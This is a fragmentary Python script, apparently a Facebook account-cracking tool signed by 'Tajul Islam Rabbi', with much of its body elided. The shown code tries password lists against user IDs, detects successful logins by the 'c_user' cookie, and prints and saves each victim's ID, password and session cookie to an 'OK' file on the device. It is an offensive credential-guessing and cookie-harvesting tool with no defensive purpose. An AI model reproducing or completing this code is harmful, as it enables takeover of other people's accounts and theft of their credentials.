# NAME : Tajul Islam Rabbi
# GITHUB : https://github.com/Hacker 1414
# FB GROUP : T . I . R A.X.L
# FB ID : Tajul Islam Rabbi
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK RABBI-OK.txt')
    print(' [😁] CP RABBI-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[RABBI]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mRABBI-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[😜] COOKIE :\033[1;95m {coki}")
                open('/sdcard/RABBI-OK.txt', 'a').write(f'{uid} | {ps}\n {coki} \n')
                oks.append(uid)
                break
            else:
                continue
